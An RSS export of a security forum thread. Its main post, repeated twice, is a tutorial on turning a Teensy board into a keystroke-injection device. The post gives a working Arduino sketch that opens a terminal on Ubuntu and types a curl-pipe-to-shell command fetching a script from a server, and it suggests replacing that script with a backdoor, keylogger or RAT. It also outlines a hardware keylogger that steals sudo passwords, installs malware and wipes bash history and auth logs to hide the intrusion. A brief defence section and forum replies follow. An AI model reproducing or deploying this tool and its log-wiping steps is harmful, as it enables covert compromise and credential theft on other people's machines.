<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Using a Teensy to Install Stuff in a Few Seconds</title>
    <link>https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161</link>
    <description>Continuing the discussion from [Plug In To Win - DIY Bad USB [Part 3/3]](https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159):

You may have read the awesome &quot;Plug In To Win&quot; series from @TheDoctor. It make me recall some experiments I did time ago on HID injection. After some private chat, we agreed to release this extra post to present one more HW alternative to this &quot;keyboard injection&quot; _attacks_. You may have already seen the code in the last part of @TheDoctor series... this goes a bit more in detail.

In this paper I will describe how to reproduce the Rubber Ducky HID injection scenario using a small microcontroller board know as [Teensy](https://www.pjrc.com/teensy/index.html). I&#39;m using a Teensy 3.0 in this paper, but any other version should just work fine. The Teensy LC (Low Cost) cost around $12... so it is a very affordable device. 

Functionally, the Teensy works just like an Arduino, however, from its first versions, the Teensy included the capability to simulate USB HID devices. HID stands for _Human Interface Device_ that is, keyboards, mouses and joysticks.

The easiest way to program the Teensy, is to install the [Arduino IDE](https://www.arduino.cc/en/Main/Software) and then upgrade it with the [Teensyduino](https://www.pjrc.com/teensy/teensyduino.html) package. This will give you access to a lot of Arduino enable libraries and allow you to get the most out of your little Teensy board. The installation uses a standard graphical wizard... cannot be easier.

# Test Environment
For testing this PoC, we are going to use a local HTTP server able to serve some backdoor/malware SW. Same concept used on[ Part1](https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154) of @TheDoctor&#39;s series. You can use your own server on the Internet if you want to. This local server solution will let you play with this idea even if you do not have a server on the Internet...

So this is how I did set it up:

```
$ cd /tmp
$ mkdir server
$ cd server
$ cat &lt;&lt; EOM &gt; b.sh
xeyes &amp;
EOM
$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

Yep, this devastating malware launches `xeyes` and those little eyes will stare at you for the rest of the day... That&#39;s scary man!

In order to download and run the `b.sh` uber-malware we should run something like this:

`$ curl -s http://127.0.0.1:8000/b.sh | /bin/sh`

Change `b.sh` to suit your needs (install a backdoor, keylogger, RAT,...), and `127.0.0.1` to whatever server you want to use.

# The Teensy Script
The Teensy script is very simple. As with the USB Rubber Duck you have some functions to simulate different keys press and release events. In this script, we are assuming that the target machine is running the default Ubuntu Desktop. In this desktop, you can open a terminal by pressing `CTRL+ATL+T`. For other environments you may need to change the script... Yep, this is just a PoC. You can close a terminal pressing `CTRL+D`... so, knowing this, the script will look like this:

```
void release_keys (void)
{
 // Release all keys
  Keyboard.set_modifier (0);  
  Keyboard.send_now();
  delay (100);
}

void setup() {
  // put your setup code here, to run once:
  delay (1000);
  // Launch terminal (GNOME CTRL+ALT+t)
  Keyboard.set_modifier (MODIFIERKEY_CTRL | MODIFIERKEY_ALT);
  Keyboard.send_now();
  delay (100);
  
  Keyboard.press(KEY_T);
  Keyboard.release(KEY_T);
  delay (500); // Wait for the terminal to come up
  
  release_keys ();
 
  // Send Command
  Keyboard.println(&quot;curl -s http://127.0.0.1:8000/b.sh | /bin/sh&quot;);

  // Close terminal (CTRL+D)
  Keyboard.set_modifier (MODIFIERKEY_CTRL);
  Keyboard.send_now();
  delay (100);
  Keyboard.press(KEY_D);
  Keyboard.release(KEY_D);
  delay (100);
  release_keys ();
  
}
```

&gt; You can find more details on how to use the teensy in https://www.pjrc.com/teensy/td_keyboard.html

I think the code is pretty straightforward to understand. However a couple of comments may help:

- The `CTRL`, `ALT`, `SHIFT`,... keys are usually pressed together with other keys. These keys are usually known as modifiers and we can press many of them at the same time. So, we have to use the `set_modifier` method from  `Keyboard`, to activate and deactivate the use of those keys.
- Note that, once a modifier key is activated, it will remain activated until we release it. That is what the `release_keys` function does... we make it into a function because we have to call it at least twice in the code.
- Finally, whenever you press a single key... you also have to release it.

This is it. Upload the sketch to the Teensy and then, whenever you plug it into a Ubuntu machine, it will bring up a Terminal Emulator, download and run some code form a remote server and then close the terminal. Of course, if the screen is locked then this system will just type funny user names and passwords.

# Fine Tuning
You may have noted different `delay` calls in the sketch. You may need to adjust them. The values in the script worked fine with may machine, but they are quite in the limit. You may need to increase them to safer values.

Some notes on the timing:

- The first delay accounts for the time it takes to the computer to identify the USB device, load the driver (if needed) and create the entry at `/dev/`. Depending on the computer and its load, this may happen immediately, or may take up to a few seconds.
- Same happens with the Terminal. Usually you get a terminal immediately when you press `CTRL+ALT+T`. However, if the machine is heavy loaded, that may take also a few seconds. If the terminal is not there when we _type_ our command in the next line... then the command will just not be executed.
- During the testing I noticed that, whenever I use individual keys I need to wait a bit before sending the next keystroke to the computer.

As a rule of thumb... try to mimic in your program the way you type in your computer... that should work.

# Jumping into Real World
All this is very cool, but in real world things are not that easy. A decent user will lock its computer when s/he is away and will not use a privileged user account for normal work. This limits this attack to:

- being skilled enough to plug the device in the computer when the user is in front of you and also to keep the user sight away from the screen, so s/he will not notice the popping terminal in the screen.
- do whatever is doable with a normal user account.

So, you are, in best case, restricted to whatever you could do if you have got physical access to the machine. In a proper configured machine, that is not much.

In those case you have to go one step forward. I haven&#39;t tried any of them, so I&#39;m looking forward to you guys to implement them and report back in this thread.

# Getting a Ring 0 Malware Installed
In order to do this, you need to get Administrator access, either getting the Administrator password or running some local exploit. The local exploit scenario is pretty straightforward, just change `b.sh` for your exploit and run it. For getting the Administrator password we still have a couple of options:

- Make the `b.sh` a custom keylogger that will detect when the `sudo` command is entered and then it will capture the password. After that you have to instruct the external device to run a new script to install your software using `sudo` and the password it has just got. For that, we may need to configure the Teensy using a composite gadget driver making it behave as a keyboard and serial port at the same time.

- Build a physical key logger that sits between the user keyboard and the computer. In this case the device will capture keystrokes waiting for a `sudo` command and grabbing the password (pretty much the same). Then it will inject the command afterwards... for instance after some inactivity period. 

In general, the lock screen password is the same that the user password, that is the same that the `sudo` password. So, once the password is acquired, screen locked is no longer a problem.

# A Smart HW Key Logger 
Let&#39;s focus in the last case. Building a HW key logger that can inject Administrator commands based on some conditions. If I had to build such a thing I would:

- Grab one of those[ Arietta G25 boards](http://www.acmesystems.it/arietta). It is damn small and has extra USB ports on addition to the USB OTG port we need to simulate the HID device.
- Plug the system keyboard in one of the USB ports in the expansion header (this needs some basic soldering skills)
- Plug the USB OTG (the microUSB connector) to the computer you want to sniff the keyboard
- Configure the OTG port as a HID keyboard... ideally mimicking the vendor/product ID from the original keyboard
- Write a small program to capture the RAW keyboard events (probably just reading `/dev/input/whatever`) and then feed them into the HID device to effectively send the keyboard events to the computer.

This small program will capture all key strokes, detect when a `sudo` command gets typed by the user, capture the `sudo` key.... wait until there is no keyboard activity for let&#39;s say 10 minutes... and then _type_ the commands needed to install the malware.

The script should, in addition to installing whatever, clean up the bash history and also the system logs (at least `/var/log/auth` for Debian based systems) so the `sudo` command does not get noticed.

Anybody eager to try!... please let me know if it works.

# Protecting Yourself
Protecting yourself against this kind of attack requires to take seriously physical security. If somebody can get to your computer and plug things in it without you noticing it... well, they can do basically anything they want. And it is hard to detect.

For this specific kind of attack:

- Keep your USB ports visible so you will have more chances to notice if a HW keylogger is plugged in
- Keep your computer in such a place that makes difficult the access to the USB ports.
- Run some software that checks Vendor/Product ID for your keyboard. This can be faked, but the attacker has to figure it out
- No not allow anybody to touch your computer... specially if you are not around

Despite of the obviously bad usages of this concept, this kind of devices may be very useful, specially to quickly do something on a server machine. Think about switching off a server that does not have a keyboard or screen. You may go and grab some in order to type `shutdown`, or you can program your little device with that command, plug it in and get the thing done in seconds. What about building a custom keyboard for your preferred game? ... there are lots of useful and legit applications for a device that can simulate a USB HID!

Hack fun!

_P.S.: You can do this same thing using an Arduino Leonardo, a BeagleBone Black, your Android phone or a Rpi Zero... just to name a few_</description>
    
    <lastBuildDate>Sat, 08 Oct 2016 11:08:16 +0000</lastBuildDate>
    <category>Hardware</category>
    <atom:link href="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Using a Teensy to Install Stuff in a Few Seconds</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/10</link>
        <pubDate>Sun, 21 Jan 2018 00:34:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1161-10</guid>
        <source url="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161.rss">Using a Teensy to Install Stuff in a Few Seconds</source>
      </item>
      <item>
        <title>Using a Teensy to Install Stuff in a Few Seconds</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Good trick… I’ll try</p>
          <p><a href="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/9</link>
        <pubDate>Sat, 08 Oct 2016 11:08:16 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1161-9</guid>
        <source url="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161.rss">Using a Teensy to Install Stuff in a Few Seconds</source>
      </item>
      <item>
        <title>Using a Teensy to Install Stuff in a Few Seconds</title>
        <dc:creator><![CDATA[FFY00]]></dc:creator>
        <description><![CDATA[
            <p>Add this method to the setup and remove the first delay. The method will wait til teensy is detected as a keyboard, this will save you some time.</p>
<p>Original Code: <a href="https://github.com/samyk/usbdriveby/blob/master/usbdriveby_windows.ino" rel="nofollow noopener">https://github.com/samyk/usbdriveby/blob/master/usbdriveby_windows.ino</a></p>
<pre><code>void waitForDrivers()
        {
            while (!(keyboard_leds &amp; 2))
            {
                key(KEY_CAPS_LOCK, 0);
            }
            if (keyboard_leds &amp; 2)
            {
                key(KEY_CAPS_LOCK, 0);
            }
        }</code></pre>
          <p><a href="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/8</link>
        <pubDate>Sat, 08 Oct 2016 11:04:31 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1161-8</guid>
        <source url="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161.rss">Using a Teensy to Install Stuff in a Few Seconds</source>
      </item>
      <item>
        <title>Using a Teensy to Install Stuff in a Few Seconds</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <p>More or less. I wrote my own code.</p>
          <p><a href="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/7</link>
        <pubDate>Mon, 03 Oct 2016 21:43:16 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1161-7</guid>
        <source url="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161.rss">Using a Teensy to Install Stuff in a Few Seconds</source>
      </item>
      <item>
        <title>Using a Teensy to Install Stuff in a Few Seconds</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Loving this!! Might have to do this… Good job pico <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"> - as always</p>
          <p><a href="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/6</link>
        <pubDate>Mon, 03 Oct 2016 20:04:19 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1161-6</guid>
        <source url="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161.rss">Using a Teensy to Install Stuff in a Few Seconds</source>
      </item>
      <item>
        <title>Using a Teensy to Install Stuff in a Few Seconds</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Did it worked?..I tried some simple test with the Leonardo some time ago. Do not remember if they use the same functions for the HID functionality.</p>
          <p><a href="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/5</link>
        <pubDate>Mon, 03 Oct 2016 19:16:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1161-5</guid>
        <source url="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161.rss">Using a Teensy to Install Stuff in a Few Seconds</source>
      </item>
      <item>
        <title>Using a Teensy to Install Stuff in a Few Seconds</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>The USBarmory is a very neat device. It is more powerful that Arietta, but it cost more than 3 times more…</p>
<p>Thanks for sharing the videos… Haven’t read the blog post yet</p>
          <p><a href="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/4</link>
        <pubDate>Mon, 03 Oct 2016 19:15:33 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1161-4</guid>
        <source url="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161.rss">Using a Teensy to Install Stuff in a Few Seconds</source>
      </item>
      <item>
        <title>Using a Teensy to Install Stuff in a Few Seconds</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <p>Just tried the same type of thing on an <a href="https://www.arduino.cc/en/Main/ArduinoBoardLeonardo" rel="nofollow noopener">Arduino Leonardo</a>!</p>
          <p><a href="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/3</link>
        <pubDate>Mon, 03 Oct 2016 19:12:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1161-3</guid>
        <source url="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161.rss">Using a Teensy to Install Stuff in a Few Seconds</source>
      </item>
      <item>
        <title>Using a Teensy to Install Stuff in a Few Seconds</title>
        <dc:creator><![CDATA[SmartOne]]></dc:creator>
        <description><![CDATA[
            <p>Thanks for sharing the Arietta board, looks very nice! I also find <a href="https://www.youtube.com/watch?v=Oplubg5q7ao" rel="nofollow noopener">this video</a> very interesting, because it shows the great possibilities of usb attacks! <img src="https://0x00sec.org/images/emoji/twitter/grin.png?v=9" title=":grin:" class="emoji" alt=":grin:"> The <a href="https://inversepath.com/usbarmory" rel="nofollow noopener">board used in the video</a> also seems great. All in all, as always a high quality article by <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
          <p><a href="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/2</link>
        <pubDate>Mon, 03 Oct 2016 18:59:14 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1161-2</guid>
        <source url="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161.rss">Using a Teensy to Install Stuff in a Few Seconds</source>
      </item>
      <item>
        <title>Using a Teensy to Install Stuff in a Few Seconds</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Continuing the discussion from <a href="https://0x00sec.org/t/plug-in-to-win-diy-bad-usb-part-3-3/1159">Plug In To Win - DIY Bad USB [Part 3/3]</a>:</p>
<p>You may have read the awesome “Plug In To Win” series from <a class="mention" href="https://0x00sec.org/u/thedoctor">@TheDoctor</a>. It make me recall some experiments I did time ago on HID injection. After some private chat, we agreed to release this extra post to present one more HW alternative to this “keyboard injection” <em>attacks</em>. You may have already seen the code in the last part of <a class="mention" href="https://0x00sec.org/u/thedoctor">@TheDoctor</a> series… this goes a bit more in detail.</p>
<p>In this paper I will describe how to reproduce the Rubber Ducky HID injection scenario using a small microcontroller board know as <a href="https://www.pjrc.com/teensy/index.html" rel="nofollow noopener">Teensy</a>. I’m using a Teensy 3.0 in this paper, but any other version should just work fine. The Teensy LC (Low Cost) cost around $12… so it is a very affordable device.</p>
<p>Functionally, the Teensy works just like an Arduino, however, from its first versions, the Teensy included the capability to simulate USB HID devices. HID stands for <em>Human Interface Device</em> that is, keyboards, mouses and joysticks.</p>
<p>The easiest way to program the Teensy, is to install the <a href="https://www.arduino.cc/en/Main/Software" rel="nofollow noopener">Arduino IDE</a> and then upgrade it with the <a href="https://www.pjrc.com/teensy/teensyduino.html" rel="nofollow noopener">Teensyduino</a> package. This will give you access to a lot of Arduino enable libraries and allow you to get the most out of your little Teensy board. The installation uses a standard graphical wizard… cannot be easier.</p>
<h1>Test Environment</h1>
<p>For testing this PoC, we are going to use a local HTTP server able to serve some backdoor/malware SW. Same concept used on<a href="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154"> Part1</a> of <a class="mention" href="https://0x00sec.org/u/thedoctor">@TheDoctor</a>’s series. You can use your own server on the Internet if you want to. This local server solution will let you play with this idea even if you do not have a server on the Internet…</p>
<p>So this is how I did set it up:</p>
<pre><code class="lang-auto">$ cd /tmp
$ mkdir server
$ cd server
$ cat &lt;&lt; EOM &gt; b.sh
xeyes &amp;
EOM
$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
</code></pre>
<p>Yep, this devastating malware launches <code>xeyes</code> and those little eyes will stare at you for the rest of the day… That’s scary man!</p>
<p>In order to download and run the <code>b.sh</code> uber-malware we should run something like this:</p>
<p><code>$ curl -s http://127.0.0.1:8000/b.sh | /bin/sh</code></p>
<p>Change <code>b.sh</code> to suit your needs (install a backdoor, keylogger, RAT,…), and <code>127.0.0.1</code> to whatever server you want to use.</p>
<h1>The Teensy Script</h1>
<p>The Teensy script is very simple. As with the USB Rubber Duck you have some functions to simulate different keys press and release events. In this script, we are assuming that the target machine is running the default Ubuntu Desktop. In this desktop, you can open a terminal by pressing <code>CTRL+ATL+T</code>. For other environments you may need to change the script… Yep, this is just a PoC. You can close a terminal pressing <code>CTRL+D</code>… so, knowing this, the script will look like this:</p>
<pre><code class="lang-auto">void release_keys (void)
{
 // Release all keys
  Keyboard.set_modifier (0);  
  Keyboard.send_now();
  delay (100);
}

void setup() {
  // put your setup code here, to run once:
  delay (1000);
  // Launch terminal (GNOME CTRL+ALT+t)
  Keyboard.set_modifier (MODIFIERKEY_CTRL | MODIFIERKEY_ALT);
  Keyboard.send_now();
  delay (100);
  
  Keyboard.press(KEY_T);
  Keyboard.release(KEY_T);
  delay (500); // Wait for the terminal to come up
  
  release_keys ();
 
  // Send Command
  Keyboard.println("curl -s http://127.0.0.1:8000/b.sh | /bin/sh");

  // Close terminal (CTRL+D)
  Keyboard.set_modifier (MODIFIERKEY_CTRL);
  Keyboard.send_now();
  delay (100);
  Keyboard.press(KEY_D);
  Keyboard.release(KEY_D);
  delay (100);
  release_keys ();
  
}
</code></pre>
<blockquote>
<p>You can find more details on how to use the teensy in <a href="https://www.pjrc.com/teensy/td_keyboard.html" rel="nofollow noopener">https://www.pjrc.com/teensy/td_keyboard.html</a></p>
</blockquote>
<p>I think the code is pretty straightforward to understand. However a couple of comments may help:</p>
<ul>
<li>The <code>CTRL</code>, <code>ALT</code>, <code>SHIFT</code>,… keys are usually pressed together with other keys. These keys are usually known as modifiers and we can press many of them at the same time. So, we have to use the <code>set_modifier</code> method from  <code>Keyboard</code>, to activate and deactivate the use of those keys.</li>
<li>Note that, once a modifier key is activated, it will remain activated until we release it. That is what the <code>release_keys</code> function does… we make it into a function because we have to call it at least twice in the code.</li>
<li>Finally, whenever you press a single key… you also have to release it.</li>
</ul>
<p>This is it. Upload the sketch to the Teensy and then, whenever you plug it into a Ubuntu machine, it will bring up a Terminal Emulator, download and run some code form a remote server and then close the terminal. Of course, if the screen is locked then this system will just type funny user names and passwords.</p>
<h1>Fine Tuning</h1>
<p>You may have noted different <code>delay</code> calls in the sketch. You may need to adjust them. The values in the script worked fine with may machine, but they are quite in the limit. You may need to increase them to safer values.</p>
<p>Some notes on the timing:</p>
<ul>
<li>The first delay accounts for the time it takes to the computer to identify the USB device, load the driver (if needed) and create the entry at <code>/dev/</code>. Depending on the computer and its load, this may happen immediately, or may take up to a few seconds.</li>
<li>Same happens with the Terminal. Usually you get a terminal immediately when you press <code>CTRL+ALT+T</code>. However, if the machine is heavy loaded, that may take also a few seconds. If the terminal is not there when we <em>type</em> our command in the next line… then the command will just not be executed.</li>
<li>During the testing I noticed that, whenever I use individual keys I need to wait a bit before sending the next keystroke to the computer.</li>
</ul>
<p>As a rule of thumb… try to mimic in your program the way you type in your computer… that should work.</p>
<h1>Jumping into Real World</h1>
<p>All this is very cool, but in real world things are not that easy. A decent user will lock its computer when s/he is away and will not use a privileged user account for normal work. This limits this attack to:</p>
<ul>
<li>being skilled enough to plug the device in the computer when the user is in front of you and also to keep the user sight away from the screen, so s/he will not notice the popping terminal in the screen.</li>
<li>do whatever is doable with a normal user account.</li>
</ul>
<p>So, you are, in best case, restricted to whatever you could do if you have got physical access to the machine. In a proper configured machine, that is not much.</p>
<p>In those case you have to go one step forward. I haven’t tried any of them, so I’m looking forward to you guys to implement them and report back in this thread.</p>
<h1>Getting a Ring 0 Malware Installed</h1>
<p>In order to do this, you need to get Administrator access, either getting the Administrator password or running some local exploit. The local exploit scenario is pretty straightforward, just change <code>b.sh</code> for your exploit and run it. For getting the Administrator password we still have a couple of options:</p>
<ul>
<li>
<p>Make the <code>b.sh</code> a custom keylogger that will detect when the <code>sudo</code> command is entered and then it will capture the password. After that you have to instruct the external device to run a new script to install your software using <code>sudo</code> and the password it has just got. For that, we may need to configure the Teensy using a composite gadget driver making it behave as a keyboard and serial port at the same time.</p>
</li>
<li>
<p>Build a physical key logger that sits between the user keyboard and the computer. In this case the device will capture keystrokes waiting for a <code>sudo</code> command and grabbing the password (pretty much the same). Then it will inject the command afterwards… for instance after some inactivity period.</p>
</li>
</ul>
<p>In general, the lock screen password is the same that the user password, that is the same that the <code>sudo</code> password. So, once the password is acquired, screen locked is no longer a problem.</p>
<h1>A Smart HW Key Logger</h1>
<p>Let’s focus in the last case. Building a HW key logger that can inject Administrator commands based on some conditions. If I had to build such a thing I would:</p>
<ul>
<li>Grab one of those<a href="http://www.acmesystems.it/arietta" rel="nofollow noopener"> Arietta G25 boards</a>. It is damn small and has extra USB ports on addition to the USB OTG port we need to simulate the HID device.</li>
<li>Plug the system keyboard in one of the USB ports in the expansion header (this needs some basic soldering skills)</li>
<li>Plug the USB OTG (the microUSB connector) to the computer you want to sniff the keyboard</li>
<li>Configure the OTG port as a HID keyboard… ideally mimicking the vendor/product ID from the original keyboard</li>
<li>Write a small program to capture the RAW keyboard events (probably just reading <code>/dev/input/whatever</code>) and then feed them into the HID device to effectively send the keyboard events to the computer.</li>
</ul>
<p>This small program will capture all key strokes, detect when a <code>sudo</code> command gets typed by the user, capture the <code>sudo</code> key… wait until there is no keyboard activity for let’s say 10 minutes… and then <em>type</em> the commands needed to install the malware.</p>
<p>The script should, in addition to installing whatever, clean up the bash history and also the system logs (at least <code>/var/log/auth</code> for Debian based systems) so the <code>sudo</code> command does not get noticed.</p>
<p>Anybody eager to try!.. please let me know if it works.</p>
<h1>Protecting Yourself</h1>
<p>Protecting yourself against this kind of attack requires to take seriously physical security. If somebody can get to your computer and plug things in it without you noticing it… well, they can do basically anything they want. And it is hard to detect.</p>
<p>For this specific kind of attack:</p>
<ul>
<li>Keep your USB ports visible so you will have more chances to notice if a HW keylogger is plugged in</li>
<li>Keep your computer in such a place that makes difficult the access to the USB ports.</li>
<li>Run some software that checks Vendor/Product ID for your keyboard. This can be faked, but the attacker has to figure it out</li>
<li>No not allow anybody to touch your computer… specially if you are not around</li>
</ul>
<p>Despite of the obviously bad usages of this concept, this kind of devices may be very useful, specially to quickly do something on a server machine. Think about switching off a server that does not have a keyboard or screen. You may go and grab some in order to type <code>shutdown</code>, or you can program your little device with that command, plug it in and get the thing done in seconds. What about building a custom keyboard for your preferred game? … there are lots of useful and legit applications for a device that can simulate a USB HID!</p>
<p>Hack fun!</p>
<p><em>P.S.: You can do this same thing using an Arduino Leonardo, a BeagleBone Black, your Android phone or a Rpi Zero… just to name a few</em></p>
          <p><a href="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161/1</link>
        <pubDate>Mon, 03 Oct 2016 16:57:28 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1161-1</guid>
        <source url="https://0x00sec.org/t/using-a-teensy-to-install-stuff-in-a-few-seconds/1161.rss">Using a Teensy to Install Stuff in a Few Seconds</source>
      </item>
  </channel>
</rss>
